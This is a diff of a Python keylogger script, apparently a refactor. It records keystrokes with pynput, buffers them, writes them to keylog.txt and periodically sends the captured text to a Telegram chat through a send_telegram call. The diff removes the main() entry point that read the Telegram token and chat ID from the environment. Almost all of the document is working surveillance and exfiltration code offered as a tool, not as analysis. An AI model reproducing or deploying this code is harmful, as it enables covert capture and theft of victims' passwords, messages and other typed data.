@@ -1,13 +1,8 @@
 from pynput import keyboard
 import datetime
-import sys
-import os
-import requests
 import threading
-from dotenv import load_dotenv
+import requests
 
-
-load_dotenv()
 
 class SimpleKeylogger:
     def __init__(self, filename="keylog.txt", telegram_token=None, telegram_chat_id=None):
@@ -15,7 +10,7 @@ class SimpleKeylogger:
         self.start_time = datetime.datetime.now()
         self.key_count = 0
         self.current_word = ""
-        self.buffer = ""  
+        self.buffer = ""
         self.telegram_token = telegram_token
         self.telegram_chat_id = telegram_chat_id
         self.running = True
@@ -33,12 +28,11 @@ class SimpleKeylogger:
             pass
 
     def flush_buffer(self):
-        if self.buffer: 
+        if self.buffer:
             with open(self.filename, "a", encoding="utf-8") as f:
                 f.write(self.buffer)
 
             self.send_telegram(self.buffer)
-
             self.buffer = ""
 
     def periodic_flush(self):
@@ -119,25 +113,19 @@ class SimpleKeylogger:
                 if self.current_word:
                     self.current_word = self.current_word[:-1]
             elif key == keyboard.Key.esc:
-   
                 if self.current_word:
                     self.display_word()
                 print("\n\033[1;31m[!]\033[0m ESC detected, stopping keylogger...")
-           
                 return False
 
-          
             print("\033[1;32m[{}]\033[0m {}".format(current_time, key_name))
 
         except Exception:
-          
             return True
 
-        
         if key != keyboard.Key.esc:
             self.buffer += log_entry
 
-        
         if len(self.buffer) >= 200:
             self.flush_buffer()
 
@@ -158,6 +146,7 @@ class SimpleKeylogger:
         print("\033[1;37m" + "=" * 70 + "\033[0m")
 
     def start(self):
+        import os
         os.system('clear' if os.name == 'posix' else 'cls')
 
         self.print_banner()
@@ -165,7 +154,6 @@ class SimpleKeylogger:
         print("\033[1;33m[*]\033[0m Press \033[1;31mESC\033[0m to stop the keylogger")
         print("\033[1;33m[*]\033[0m Listening for keystrokes...\n")
         print("\033[1;37m" + "-" * 70 + "\033[0m\n")
-
 
         if self.telegram_token and self.telegram_chat_id:
             self.timer = threading.Timer(self.timer_interval, self.periodic_flush)
@@ -179,40 +167,5 @@ class SimpleKeylogger:
             self.running = False
             if self.timer:
                 self.timer.cancel()
-           
             self.flush_buffer()
             self.print_footer()
-
-def main():
-    print("\033[1;33m[*]\033[0m Initializing keylogger...")
-
-    # ===== KONFIGURASI TELEGRAM =====
-    # Ganti dengan token dan chat ID Anda
-    # Ambil dari environment variable
-    TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
-    TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
-   
-
-    # Alternatif: gunakan environment variable untuk keamanan
-    # import os
-    # TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
-    # TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
-
-    logger = SimpleKeylogger(
-        filename="keylog.txt",
-        telegram_token=TELEGRAM_TOKEN,
-        telegram_chat_id=TELEGRAM_CHAT_ID
-    )
-
-    try:
-        logger.start()
-    except KeyboardInterrupt:
-        print("\n\033[1;31m[!]\033[0m Keylogger interrupted by user (Ctrl+C)")
-        logger.print_footer()
-    except Exception as e:
-        print(f"\n\033[1;31m[!]\033[0m Error: {str(e)}\033[0m")
-        sys.exit(1)
-
-
-if __name__ == "__main__":
-    main()
